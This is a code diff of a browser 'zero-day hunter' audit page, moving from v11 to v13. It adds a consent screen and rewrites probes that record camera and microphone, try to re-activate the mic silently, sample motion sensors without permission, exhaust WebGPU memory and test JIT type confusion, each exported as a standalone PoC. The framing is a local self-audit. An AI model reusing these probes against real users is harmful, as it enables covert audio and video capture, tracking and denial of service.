@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Universal Browser Zero-Day Hunter · Hero Audit v11</title>
+<title>Universal Browser Zero-Day Hunter · Hero Audit v13</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@200;400;700;800&display=swap');
   :root{
@@ -20,6 +20,17 @@
   #bgCanvas{position:fixed;inset:0;z-index:-1;opacity:0.15;pointer-events:none}
   body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0px,rgba(0,0,0,0) 2px,rgba(0,0,0,.3) 3px,rgba(0,0,0,0) 4px);mix-blend-mode:multiply;opacity:.5;}
   #progress{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent-2));width:0;z-index:10000;box-shadow:0 0 12px var(--accent);transition:width .3s ease;}
+  
+  #consentOverlay{position:fixed;inset:0;z-index:10001;background:rgba(3,3,6,0.98);display:flex;align-items:center;justify-content:center;padding:20px;}
+  #consentBox{max-width:650px;border:1px solid var(--critical);background:var(--bg-card);padding:40px;text-align:left;box-shadow:0 0 40px rgba(255,0,85,0.2);}
+  #consentBox h2{color:var(--critical);font-size:18px;letter-spacing:.2em;text-transform:uppercase;margin-bottom:20px;text-align:center;}
+  #consentBox p{font-size:13px;color:var(--fg-dim);margin-bottom:15px;line-height:1.8;}
+  #consentBox ul{margin-bottom:25px;padding-left:20px;color:var(--fg);}
+  #consentBox ul li{font-size:12px;margin-bottom:8px;color:var(--info);}
+  #consentBox .warn{color:var(--high);margin-top:20px;font-weight:bold;text-align:center;}
+  #consentBtn{font-family:var(--mono);font-size:13px;letter-spacing:.2em;text-transform:uppercase;font-weight:800;background:transparent;color:var(--critical);border:1px solid var(--critical);padding:15px 40px;cursor:pointer;transition:all .2s;display:block;margin:0 auto;}
+  #consentBtn:hover{background:var(--critical);color:#000;box-shadow:0 0 30px rgba(255,0,85,.6);}
+
   header{border-bottom:1px solid var(--border-bright);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px;background:linear-gradient(180deg,rgba(8,8,13,.9),rgba(8,8,13,.4));backdrop-filter:blur(8px);position:sticky;top:0;z-index:100;}
   .brand{display:flex;align-items:center;gap:12px}
   .logo{width:32px;height:32px;border:1px solid var(--accent);position:relative;display:grid;place-items:center;background:rgba(0,255,204,.05);box-shadow:0 0 15px rgba(0,255,204,.2) inset;}
@@ -113,12 +124,29 @@
 <canvas id="bgCanvas"></canvas>
 <div id="progress"></div>
 
+<div id="consentOverlay">
+  <div id="consentBox">
+    <h2>Offensive Security Audit Notice</h2>
+    <p>You are initiating a deep architectural audit of your browser. This tool attempts to exploit permission lifecycles, harvest hardware data, and test memory boundaries. All data is saved locally; nothing is exfiltrated.</p>
+    <p>By clicking below, you explicitly authorize the following actions:</p>
+    <ul>
+      <li>Request access to your Camera and Microphone. If granted, it will record 10 seconds of audio and capture 1 video frame as proof artifacts.</li>
+      <li>Test the microphone permission lifecycle by attempting to silently re-activate the mic 6 seconds after you close the initial stream.</li>
+      <li>Read all available mobile/motion sensors (Accelerometer, Gyroscope, etc.) at high frequency without prompts.</li>
+      <li>Probe JIT compilers and WebGPU memory for crash boundaries, which may cause tab instability.</li>
+      <li>Attempt cross-origin network requests from fully sandboxed iframes.</li>
+    </ul>
+    <p class="warn">WARNING: The browser will still show its native OS permission prompts for mic/camera. You must click "Allow" on those native prompts for the media audit chains to execute.</p>
+    <button id="consentBtn">I Authorize The Deep Audit</button>
+  </div>
+</div>
+
 <header>
   <div class="brand">
     <div class="logo"></div>
     <div>
-      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v11</span></h1>
-      <div class="sub">9-dof mobile orchestration · worklet exfil · gesture cascade · local only</div>
+      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v13</span></h1>
+      <div class="sub">consent-driven media exfil · lifecycle bypass · local only</div>
     </div>
   </div>
   <div class="status armed" id="statusBox">
@@ -130,8 +158,8 @@
 
 <main>
   <div class="nuke-btn-wrap">
-    <button id="nukeBtn" class="nuke-btn">INITIATE ARCHITECTURAL AUDIT</button>
-    <span class="nuke-btn-warning">CLICK HARVESTS GESTURE FOR CAM/PERMISSION CASCADE BEFORE 0-CLICK PROBES RUN</span>
+    <button id="nukeBtn" class="nuke-btn" disabled>INITIATE ARCHITECTURAL AUDIT</button>
+    <span class="nuke-btn-warning">CONSENT REQUIRED · PROBES MOBILE SENSORS AND PERMISSION EXPIRATION RACES</span>
   </div>
 
   <div class="stats">
@@ -296,20 +324,93 @@ function encodeWAV(samples, sampleRate) {
    GESTURE-AMPLIFIED PROBES (MUST RUN FIRST TO CONSUME THE CLICK)
    ======================================================================== */
 
-async function chain1_TransientActivationMicRace() {
-  const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 1:</k> Transient Activation Mic Auto-Grant Race');
+async function chain1_MediaConsentHarvestAndExfil() {
+  const cat = 'Hardware API Surface';
+  log('EXP', '<k>CHAIN 1:</k> Real Media Consent Harvest, Exfil & Lifecycle Race');
   try {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    let firstStream;
-    try {
-      firstStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      firstStream.getTracks().forEach(t => t.stop());
-    } catch(e) { log('INF', '<k>CHAIN 1:</k> GUM denied, cannot test race.'); return; }
-
-    log('INF', '<k>WAITING:</k> 6s for transient activation to expire...');
-    await delay(6000);
     
+    // 1. Request standard consent for BOTH video and audio simultaneously.
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+    } catch(e) {
+      log('INF', `<k>CHAIN 1:</k> Media denied: ${e.message}. Skipping media exfil.`);
+      return;
+    }
+
+    log('OK', '<k>CONSENT GRANTED:</k> Harvesting media artifacts...');
+    const audioTrack = stream.getAudioTracks()[0];
+    const videoTrack = stream.getVideoTracks()[0];
+
+    // 2. Capture Video Frame to PNG
+    try {
+      const video = document.createElement('video');
+      video.srcObject = new MediaStream([videoTrack]);
+      video.muted = true; video.play();
+      await delay(1000); // Wait for video to render a frame
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const pngUrl = canvas.toDataURL('image/png');
+      const pngBlob = await (await fetch(pngUrl)).blob();
+      const proofUrl = URL.createObjectURL(pngBlob);
+      addFinding(cat, 'Camera Frame Exfiltration PoC', 'HIGH', 'Captured 1 frame from granted camera stream to PNG artifact.', {res: `${canvas.width}x${canvas.height}`}, 10.0, proofUrl, 'camera-frame-poc.png');
+      video.pause();
+    } catch(e) { log('WRN', `Video exfil err: ${e.message}`); }
+
+    // 3. Record 10 seconds of real ambient audio to WAV
+    try {
+      const AC = window.AudioContext || window.webkitAudioContext;
+      const ctx = new AC();
+      const workletCode = `
+        class RecorderProcessor extends AudioWorkletProcessor {
+          process(inputs) {
+            const input = inputs[0];
+            if (input.length > 0) { this.port.postMessage(new Float32Array(input[0])); }
+            return true;
+          }
+        }
+        registerProcessor('recorder-worklet', RecorderProcessor);
+      `;
+      const workletBlob = new Blob([workletCode], {type: 'application/javascript'});
+      await ctx.audioWorklet.addModule(URL.createObjectURL(workletBlob));
+      
+      const src = ctx.createMediaStreamSource(new MediaStream([audioTrack]));
+      const node = new AudioWorkletNode(ctx, 'recorder-worklet');
+      const pcmData = [];
+      node.port.onmessage = (e) => pcmData.push(e.data);
+      src.connect(node); // Do not connect to destination to avoid feedback loop
+      
+      log('INF', '<k>AUDIO EXFIL:</k> Recording 10 seconds of real ambient audio...');
+      await delay(10000);
+      
+      node.disconnect(); src.disconnect();
+      let totalLength = pcmData.reduce((acc, arr) => acc + arr.length, 0);
+      const flatData = new Float32Array(totalLength);
+      let offset = 0;
+      for (const arr of pcmData) { flatData.set(arr, offset); offset += arr.length; }
+      const wavBlob = encodeWAV(flatData, ctx.sampleRate);
+      const proofUrl = URL.createObjectURL(wavBlob);
+      
+      addFinding(cat, '10s Ambient Audio Exfiltration PoC', 'HIGH', 'Recorded 10 seconds of real ambient audio via AudioWorklet to WAV artifact.', {duration_sec: 10, sample_rate: ctx.sampleRate}, 10.0, proofUrl, '10s-ambient-audio-poc.wav');
+      await ctx.close();
+    } catch(e) { log('WRN', `Audio exfil err: ${e.message}`); }
+
+    // 4. Hardware Oracle
+    try {
+      const settings = videoTrack.getSettings();
+      const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : {};
+      const hwData = { settings, capabilities };
+      addFinding(cat, 'Camera Hardware Oracle', 'HIGH', 'Extracted exact camera hardware capabilities.', hwData, 8.0, createProofBlob(JSON.stringify(hwData, null, 2), 'application/json'), 'camera-oracle.json');
+    } catch(e) {}
+
+    // 5. Stop streams to reset UI
+    stream.getTracks().forEach(t => t.stop());
+    log('OK', '<k>STREAMS STOPPED:</k> Waiting 6s to test silent re-activation race...');
+
+    // 6. Transient Activation Race: Try to get audio back WITHOUT a gesture
+    await delay(6000);
     const t1 = performance.now();
     const secondCallPromise = navigator.mediaDevices.getUserMedia({ audio: true });
     const result = await Promise.race([
@@ -321,78 +422,31 @@ async function chain1_TransientActivationMicRace() {
 
     if (result === 'resolved' && dt < 200) {
       const standaloneJs = `document.body.onclick=async()=>{let s1=await navigator.mediaDevices.getUserMedia({audio:true});s1.getTracks().forEach(t=>t.stop());console.log("First access ok. Wait 6s...");setTimeout(async()=>{let t0=performance.now();let s2=await navigator.mediaDevices.getUserMedia({audio:true});let dt=performance.now()-t0;console.log("2nd access in",dt,"ms");if(dt<200)console.log("BYPASS DETECTED");s2.getTracks().forEach(t=>t.stop());},6000);};`;
-      addFinding(cat, 'Transient Activation Auto-Grant', 'CRITICAL', `getUserMedia auto-granted in ${dt.toFixed(0)}ms without gesture.`, {dt: dt.toFixed(0)}, 15.0, createProofBlob(`2nd GUM dt: ${dt.toFixed(0)}ms`, 'text/plain'), 'transient-bypass.txt', createStandaloneHtmlPoC('Transient Bypass PoC', standaloneJs), 'transient-poc.html');
-      addVuln('Transient Activation Expiration Bypass', 'CRITICAL', 'Second GUM call auto-granted <200ms after activation expired.', 'Strictly enforce transient activation for EVERY getUserMedia call.');
+      addFinding('Permission Bypass Chains', 'Transient Activation Auto-Grant', 'CRITICAL', `getUserMedia auto-granted in ${dt.toFixed(0)}ms without gesture after stream stop.`, {dt: dt.toFixed(0)}, 15.0, createProofBlob(`2nd GUM dt: ${dt.toFixed(0)}ms`, 'text/plain'), 'transient-bypass.txt', createStandaloneHtmlPoC('Transient Bypass PoC', standaloneJs), 'transient-poc.html');
+      addVuln('Transient Activation Expiration Bypass', 'CRITICAL', 'Second GUM call auto-granted <200ms after activation expired. This allows a hostile page to silently re-activate the mic after the user believes they have stopped it.', 'Strictly enforce transient activation for EVERY getUserMedia call.');
     } else {
-      log('OK', `<k>CHAIN 1:</k> Properly gated (${result}, ${dt.toFixed(0)}ms).`);
+      log('OK', `<k>RACE RESULT:</k> Properly gated (${result}, ${dt.toFixed(0)}ms).`);
     }
   } catch(e) { log('WRN', `Chain 1 err: ${e.message}`); }
 }
 
-async function chain2_CameraHardwareOracle() {
-  const cat = 'Hardware API Surface';
-  log('EXP', '<k>CHAIN 2:</k> Camera Hardware Oracle (Gesture Harvest)');
-  try {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-    
-    let stream;
-    try {
-      // Consume the click gesture to get camera access and read hardware constraints
-      stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    } catch(e) {
-      log('INF', '<k>CHAIN 2:</k> Camera denied, cannot read hardware oracle.');
-      return;
-    }
-
-    const track = stream.getVideoTracks()[0];
-    const settings = track.getSettings();
-    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
-    
-    // Immediately kill the stream so the user doesn't see the camera light stay on
-    track.stop();
-
-    const hardwareData = {
-      width: settings.width, height: settings.height, 
-      frameRate: settings.frameRate, deviceId: settings.deviceId,
-      facingMode: settings.facingMode,
-      max_capabilities: capabilities
-    };
-
-    const standaloneJs = `navigator.mediaDevices.getUserMedia({video:true}).then(s=>{let t=s.getVideoTracks()[0];console.log("Settings:",t.getSettings());console.log("Caps:",t.getCapabilities());t.stop();});`;
-    addFinding(cat, 'Camera Hardware Oracle', 'HIGH', 'Extracted exact camera hardware capabilities and rigid limits via getUserMedia using gesture harvest.', hardwareData, 12.0, createProofBlob(JSON.stringify(hardwareData, null, 2), 'application/json'), 'camera-oracle.json', createStandaloneHtmlPoC('Camera Oracle PoC', standaloneJs), 'camera-oracle-poc.html');
-    addVuln('Camera Hardware Capability Fingerprinting', 'HIGH', 'getUserMedia exposes exact sensor capabilities (max resolution, framerates, facing mode) which acts as a high-entropy hardware fingerprint even if the stream is immediately stopped.', 'Do not expose getCapabilities() until persistent user consent for streaming is established. Mask exact hardware limits.');
-  } catch(e) { log('WRN', `Chain 2 err: ${e.message}`); }
-}
-
-async function chain3_GesturePermissionCascade() {
+async function chain2_GesturePermissionCascade() {
   const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 3:</k> Gesture-Amplified Permission Cascade');
+  log('EXP', '<k>CHAIN 2:</k> Gesture-Amplified Permission Cascade');
   try {
-    // Fire multiple high-privacy impact APIs simultaneously using the click gesture
     const promises = [];
     let results = {};
 
     if (window.IdleDetector) {
-      promises.push(
-        IdleDetector.requestPermission().then(s => results.idle_detector = s).catch(e => results.idle_detector = `err:${e.name}`)
-      );
+      promises.push(IdleDetector.requestPermission().then(s => results.idle_detector = s).catch(e => results.idle_detector = `err:${e.name}`));
     }
     if (window.queryLocalFonts) {
-      promises.push(
-        window.queryLocalFonts().then(fonts => {
-          results.local_fonts_count = fonts.length;
-          results.local_fonts_sample = fonts.slice(0, 10).map(f => f.fullName);
-        }).catch(e => results.local_fonts = `err:${e.name}`)
-      );
+      promises.push(window.queryLocalFonts().then(fonts => { results.local_fonts_count = fonts.length; results.local_fonts_sample = fonts.slice(0, 10).map(f => f.fullName); }).catch(e => results.local_fonts = `err:${e.name}`));
     }
     if (navigator.windowManagement) {
-      promises.push(
-        navigator.windowManagement.requestPermission().then(s => results.window_mgmt = s).catch(e => results.window_mgmt = `err:${e.name}`)
-      );
+      promises.push(navigator.windowManagement.requestPermission().then(s => results.window_mgmt = s).catch(e => results.window_mgmt = `err:${e.name}`));
     }
 
-    // Race against a 1.5s timeout. If the browser prompts the user, the promise will hang and time out.
-    // If it auto-grants using the transient activation, it resolves immediately.
     await Promise.race([Promise.allSettled(promises), delay(1500)]);
 
     let bypassDetected = false;
@@ -404,11 +458,11 @@ async function chain3_GesturePermissionCascade() {
     
     if (bypassDetected) {
       addFinding(cat, 'Gesture-Amplified Permission Cascade', 'CRITICAL', 'Transient activation used to auto-grant high-privacy permissions without standard OS prompts.', results, 15.0, createProofBlob(JSON.stringify(results, null, 2), 'application/json'), 'permission-cascade.json', createStandaloneHtmlPoC('Permission Cascade PoC', standaloneJs), 'permission-cascade-poc.html');
-      addVuln('Transient Activation Auto-Grants Privacy Permissions', 'CRITICAL', 'The click gesture was used to bypass OS-level permission UI for IdleDetector, LocalFonts, or WindowManagement. These APIs auto-granted without explicit user opt-in.', 'Require explicit, separate user opt-in UI for high-privacy APIs. Do not accept transient activation as sole consent.');
+      addVuln('Transient Activation Auto-Grants Privacy Permissions', 'CRITICAL', 'The click gesture was used to bypass OS-level permission UI for IdleDetector, LocalFonts, or WindowManagement.', 'Require explicit, separate user opt-in UI for high-privacy APIs.');
     } else {
       addFinding(cat, 'Gesture Cascade Handled', 'INFO', 'High-privacy APIs correctly ignored transient activation or prompted user.', results, 1.0, createProofBlob(JSON.stringify(results, null, 2), 'application/json'), 'permission-cascade.json', createStandaloneHtmlPoC('Permission Cascade PoC', standaloneJs), 'permission-cascade-poc.html');
     }
-  } catch(e) { log('WRN', `Chain 3 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 2 err: ${e.message}`); }
 }
 
 
@@ -416,98 +470,28 @@ async function chain3_GesturePermissionCascade() {
    0-CLICK ARCHITECTURAL PROBES (RUN AFTER GESTURE EXPIRES)
    ======================================================================== */
 
-async function chain4_10sAudioWorkletExfil() {
-  const cat = 'Hardware API Surface';
-  log('EXP', '<k>CHAIN 4:</k> 10-Second High-Fidelity AudioWorklet Exfiltration');
-  try {
-    const AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    const ctx = new AC();
-    if (ctx.state === 'suspended') await ctx.resume(); // Resume silently if allowed
-
-    // AudioWorklet guarantees execution on the audio thread, bypassing DOM throttling
-    const workletCode = `
-      class RecorderProcessor extends AudioWorkletProcessor {
-        process(inputs) {
-          const input = inputs[0];
-          if (input.length > 0) {
-            const channelData = input[0];
-            this.port.postMessage(new Float32Array(channelData));
-          }
-          return true;
-        }
-      }
-      registerProcessor('recorder-worklet', RecorderProcessor);
-    `;
-    const workletBlob = new Blob([workletCode], {type: 'application/javascript'});
-    const workletUrl = URL.createObjectURL(workletBlob);
-    await ctx.audioWorklet.addModule(workletUrl);
-
-    const osc = ctx.createOscillator();
-    osc.type = 'sine'; osc.frequency.setValueAtTime(440, 0);
-    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.1, 0);
-    
-    const node = new AudioWorkletNode(ctx, 'recorder-worklet');
-    const pcmData = [];
-    node.port.onmessage = (e) => pcmData.push(e.data);
-
-    const muteGain = ctx.createGain(); muteGain.gain.setValueAtTime(0.0, 0); // Mute output
-    
-    osc.connect(gain); gain.connect(node); node.connect(muteGain); muteGain.connect(ctx.destination);
-    
-    osc.start();
-    log('INF', '<k>AUDIO WORKLET:</k> Capturing 10 seconds of raw 440Hz PCM on audio thread...');
-    await delay(10000); // True 10 seconds
-    osc.stop(); node.disconnect(); muteGain.disconnect();
-    
-    // Flatten array of Float32Arrays
-    let totalLength = pcmData.reduce((acc, arr) => acc + arr.length, 0);
-    const flatData = new Float32Array(totalLength);
-    let offset = 0;
-    for (const arr of pcmData) { flatData.set(arr, offset); offset += arr.length; }
-
-    const wavBlob = encodeWAV(flatData, ctx.sampleRate);
-    const proofUrl = URL.createObjectURL(wavBlob);
-    
-    addFinding(cat, '10s AudioWorklet Silent Exfil', 'HIGH', 'Intercepted raw 440Hz PCM via AudioWorklet, output muted. Flawless 10s WAV artifact generated.', {duration_sec: 10, sample_rate: ctx.sampleRate, frames_captured: flatData.length}, 8.0, proofUrl, '10s-worklet-audio-pipeline.wav');
-    addVuln('AudioWorklet Background Pipeline Persistence (10s Raw PCM)', 'HIGH',
-      'A WebAudio Oscillator was routed through an AudioWorkletNode and silently muted. The raw PCM data was captured for 10 continuous seconds and encoded into a flawless WAV file. Because AudioWorklets run on a dedicated audio thread, they are immune to DOM background throttling. This proves the browser allows long-term, high-fidelity background audio processing without user interaction.',
-      'Require explicit user gesture for AudioContext processing. Disconnect AudioWorkletNode ports when context is not actively audible to user.');
-    await ctx.close();
-  } catch(e) { log('WRN', `Chain 4 err: ${e.message}`); }
-}
-
-async function chain5_Mobile9DOFSensorOrchestration() {
+async function chain3_Mobile9DOFSensorOrchestration() {
   const cat = 'Cross-Domain Covert Channels';
-  log('EXP', '<k>CHAIN 5:</k> Mobile 9-DOF Sensor Orchestration & 20kHz Coupling');
+  log('EXP', '<k>CHAIN 3:</k> Mobile 9-DOF Sensor 0-Click Orchestration');
   try {
-    const AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    const ctx = new AC();
-    
-    const osc = ctx.createOscillator();
-    osc.type = 'square'; osc.frequency.setValueAtTime(20000, 0); // 20kHz square wave
-    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.2, 0);
-    osc.connect(gain); gain.connect(ctx.destination);
-    
-    // Try ALL sensors for mobile 9-DOF orchestration
-    const sensors = [];
     const sensorDefs = [
       {name: 'Accel', cls: Accelerometer},
       {name: 'Gyro', cls: Gyroscope},
       {name: 'Mag', cls: Magnetometer},
       {name: 'LinAccel', cls: LinearAccelerationSensor},
       {name: 'AbsOrient', cls: AbsoluteOrientationSensor},
-      {name: 'RelOrient', cls: RelativeOrientationSensor}
+      {name: 'RelOrient', cls: RelativeOrientationSensor},
+      {name: 'AmbLight', cls: AmbientLightSensor}
     ];
 
     let csvData = "timestamp,sys_time";
     const activeSensors = [];
+    const sensors = [];
 
     for (const def of sensorDefs) {
       try {
         const s = new def.cls({frequency: 60});
-        csvData += `,${def.name}_x,${def.name}_y,${def.name}_z,${def.name}_q0,${def.name}_q1,${def.name}_q2,${def.name}_q3`;
+        csvData += `,${def.name}_x,${def.name}_y,${def.name}_z,${def.name}_q0,${def.name}_q1,${def.name}_q2,${def.name}_q3,${def.name}_lux`;
         s.addEventListener('reading', () => {
           let row = `\n${Date.now()},${performance.now().toFixed(2)}`;
           for (const ss of activeSensors) {
@@ -515,6 +499,7 @@ async function chain5_Mobile9DOFSensorOrchestration() {
               row += `,${s.x || 0},${s.y || 0},${s.z || 0}`;
               if (s.quaternion) row += `,${s.quaternion[0]},${s.quaternion[1]},${s.quaternion[2]},${s.quaternion[3]}`;
               else row += `,0,0,0,0`;
+              if (s.illuminance) row += `,${s.illuminance}`; else row += `,0`;
               break;
             } else {
               row += `,0,0,0,0,0,0,0,0`;
@@ -528,26 +513,24 @@ async function chain5_Mobile9DOFSensorOrchestration() {
       } catch(e) {}
     }
 
-    osc.start();
-    log('INF', `<k>9-DOF COUPLING:</k> Playing 20kHz + reading ${activeSensors.length} sensors for 5 seconds...`);
+    log('INF', `<k>9-DOF ORCH:</k> Reading ${activeSensors.length} sensors at 60Hz for 5 seconds...`);
     await delay(5000);
-    osc.stop(); sensors.forEach(s => s.stop());
-    await ctx.close();
+    sensors.forEach(s => s.stop());
     
     const proofUrl = createProofBlob(csvData, 'text/csv');
-    const standaloneJs = `const ctx=new AudioContext();const o=ctx.createOscillator();o.type='square';o.frequency.value=20000;o.connect(ctx.destination);o.start();let s=[];try{s.push(new Accelerometer({frequency:60}))}catch(e){}try{s.push(new Gyroscope({frequency:60}))}catch(e){}s.forEach(x=>{x.onreading=()=>console.log(x.x,x.y,x.z);x.start()});setTimeout(()=>{o.stop();s.forEach(x=>x.stop())},5000);`;
+    const standaloneJs = `let s=[];try{s.push(new Accelerometer({frequency:60}))}catch(e){}try{s.push(new Gyroscope({frequency:60}))}catch(e){}try{s.push(new Magnetometer({frequency:60}))}catch(e){}s.forEach(x=>{x.onreading=()=>console.log(x.x,x.y,x.z);x.start()});setTimeout(()=>s.forEach(x=>x.stop()),5000);`;
     const altUrl = createStandaloneHtmlPoC('9-DOF Sensor Orchestration PoC', standaloneJs);
     
-    addFinding(cat, '9-DOF Ultrasonic Sensor Orchestration', 'CRITICAL', `Orchestrated ${activeSensors.length} mobile sensors (Accel/Gyro/Mag/Orient) alongside 20kHz tone. CSV artifact generated.`, {active_sensors: activeSensors.map(s => s.name)}, 18.0, proofUrl, '9dof-ultrasonic-fusion.csv', altUrl, '9dof-fusion-poc.html');
-    addVuln('Cross-Domain 9-DOF Covert Channel (Mobile)', 'CRITICAL',
-      `The browser allowed simultaneous playback of a 20kHz ultrasonic tone and high-frequency sampling of ${activeSensors.length} motion/orientation sensors. On mobile devices (iPhone), speakers couple mechanically to the chassis. The IMU picks up the harmonic resonance. This allows cross-domain data exfiltration (audio -> motion) bypassing all network boundaries and microphone permissions.`,
-      'Gate all motion sensors strictly behind explicit user permission. Throttle sensor frequency when high-frequency audio is active. Implement acoustic dampning checks in OS.');
-  } catch(e) { log('WRN', `Chain 5 err: ${e.message}`); }
+    if (activeSensors.length > 0) {
+      addFinding(cat, '9-DOF Sensor 0-Click Orchestration', 'CRITICAL', `Orchestrated ${activeSensors.length} mobile sensors at 60Hz without permission. CSV artifact generated.`, {active_sensors: activeSensors.map(s => s.name)}, 18.0, proofUrl, '9dof-sensor-exfil.csv', altUrl, '9dof-fusion-poc.html');
+      addVuln('0-Click Mobile Sensor Data Exfiltration', 'CRITICAL', `The browser allowed high-frequency sampling of ${activeSensors.length} sensors without user permission. Allows keystroke inference and tracking without OS privacy UI.`, 'Gate ALL Generic Sensor API classes strictly behind explicit user permission.');
+    }
+  } catch(e) { log('WRN', `Chain 3 err: ${e.message}`); }
 }
 
-async function chain6_WebGPUMemBoundary() {
+async function chain4_WebGPUMemBoundary() {
   const cat = 'Micro-architectural Side Channels';
-  log('EXP', '<k>CHAIN 6:</k> WebGPU Memory Exhaustion Boundary');
+  log('EXP', '<k>CHAIN 4:</k> WebGPU Memory Exhaustion Boundary');
   try {
     if (!navigator.gpu) return;
     const adapter = await navigator.gpu.requestAdapter();
@@ -564,76 +547,66 @@ async function chain6_WebGPUMemBoundary() {
     } catch(e) { gracefulLoss = true; }
     buffers.forEach(b => b.destroy());
     
-    addFinding(cat, 'WebGPU OOM Boundary Probed', 'HIGH', 'Pushed GPU memory to 2GB OOM limit. Check standalone PoC to verify renderer crash.', {buffers_allocated: buffers.length}, 9.0, createProofBlob(JSON.stringify({graceful: gracefulLoss, buffers: buffers.length}, null, 2), 'application/json'), 'gpu-oom.json', altUrl, 'gpu-oom-poc.html');
+    addFinding(cat, 'WebGPU OOM Boundary Probed', 'HIGH', 'Pushed GPU memory to 2GB OOM limit.', {buffers_allocated: buffers.length}, 9.0, createProofBlob(JSON.stringify({graceful: gracefulLoss, buffers: buffers.length}, null, 2), 'application/json'), 'gpu-oom.json', altUrl, 'gpu-oom-poc.html');
     addVuln('WebGPU Memory Exhaustion Boundary', 'HIGH', 'If standalone PoC crashes tab instead of firing device.lost, it is a hard DoS.', 'Implement strict per-origin GPU memory quotas.');
-  } catch(e) { log('WRN', `Chain 6 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 4 err: ${e.message}`); }
 }
 
-async function chain7_ApplePay0Click() {
+async function chain5_ApplePay0Click() {
   const cat = 'Vendor Logic Bypasses';
-  log('EXP', '<k>CHAIN 7:</k> ApplePay Permission State Inference');
+  log('EXP', '<k>CHAIN 5:</k> ApplePay Permission State Inference');
   try {
     if (!window.ApplePaySession) return;
     const canPay = ApplePaySession.canMakePayments();
     const standaloneJs = `if(window.ApplePaySession) console.log("Has Cards:", ApplePaySession.canMakePayments());`;
     addFinding(cat, 'ApplePay 0-Click State', 'CRITICAL', 'Inferred Apple Wallet state passively.', {hasCards: canPay}, 12.5, createProofBlob(JSON.stringify({has_cards: canPay}, null, 2), 'application/json'), 'applepay.json', createStandaloneHtmlPoC('ApplePay PoC', standaloneJs), 'applepay-poc.html');
     addVuln('ApplePay Passive Fingerprinting', 'CRITICAL', `canMakePayments() returned ${canPay}.`, 'Gate behind user gesture.');
-  } catch(e) { log('WRN', `Chain 7 err: ${e.message}`); }
+  } catch(e) { log('WRN', `Chain 5 err: ${e.message}`); }
 }
 
-async function chain8_JITTypeConfusionLeakCapture() {
+async function chain6_JITTypeConfusionLeakCapture() {
   const cat = 'Memory Boundary Crashes';
-  log('EXP', '<k>CHAIN 8:</k> JIT Prototype Pollution Type Confusion & Leak Capture');
+  log('EXP', '<k>CHAIN 6:</k> JIT Prototype Pollution Type Confusion & Leak Capture');
   try {
     const standaloneJs = `
 function hot(obj) { return obj.x; }
 let o = {x: 1.1};
-for(let i=0; i<100000; i++) hot(o); // Force JIT monomorphic double optimization
-Object.prototype.x = 1094795585; // 0x41414141 as an integer
+for(let i=0; i<100000; i++) hot(o);
+Object.prototype.x = 1094795585; // 0x41414141 as integer
 try {
-  let leak = hot({}); // JIT expects double, gets integer pointer/representation
+  let leak = hot({});
   console.log("JIT Return Value (Leak):", leak);
-  if (leak !== 1094795585 && typeof leak === 'number') {
-    console.log("TYPE CONFUSION DETECTED! JIT failed to deoptimize. Returned corrupted float instead of integer.");
-  } else {
-    console.log("JIT safely deoptimized or followed prototype chain correctly.");
-  }
+  if (leak !== 1094795585 && typeof leak === 'number') console.log("TYPE CONFUSION DETECTED!");
+  else console.log("JIT safely deoptimized.");
 } catch(e) { console.log("Crash/Error:", e.message); }`;
     const altUrl = createStandaloneHtmlPoC('JIT Type Confusion PoC', standaloneJs);
 
     function hot(obj) { return obj.x; }
     let o = {x: 1.1};
     for(let i=0; i<100000; i++) hot(o);
-    Object.prototype.x = 1094795585; // 0x41414141
+    Object.prototype.x = 1094795585;
     let leakValue = "error";
     let typeConfused = false;
     try {
       leakValue = hot({});
-      if (leakValue !== 1094795585 && typeof leakValue === 'number') {
-        typeConfused = true;
-      }
+      if (leakValue !== 1094795585 && typeof leakValue === 'number') typeConfused = true;
     } catch(e) { leakValue = e.message; }
-    Object.prototype.x = undefined; // cleanup
+    Object.prototype.x = undefined;
 
-    addFinding(cat, 'JIT Type Confusion Leak Captured', 'CRITICAL', 'Forced JIT monomorphic optimization, then polluted prototype. Captured return value to detect arbitrary read primitive.', {leaked_value: leakValue, type_confusion_detected: typeConfused}, 15.0, createProofBlob(JSON.stringify({leak: leakValue, confused: typeConfused}, null, 2), 'application/json'), 'jit-confusion-leak.json', altUrl, 'jit-confusion-poc.html');
+    addFinding(cat, 'JIT Type Confusion Leak Captured', 'CRITICAL', 'Forced JIT monomorphic optimization, then polluted prototype.', {leaked_value: leakValue, type_confusion_detected: typeConfused}, 15.0, createProofBlob(JSON.stringify({leak: leakValue, confused: typeConfused}, null, 2), 'application/json'), 'jit-confusion-leak.json', altUrl, 'jit-confusion-poc.html');
     
     if (typeConfused) {
-      addVuln('JIT Prototype Pollution Type Confusion (Arbitrary Read)', 'CRITICAL', 
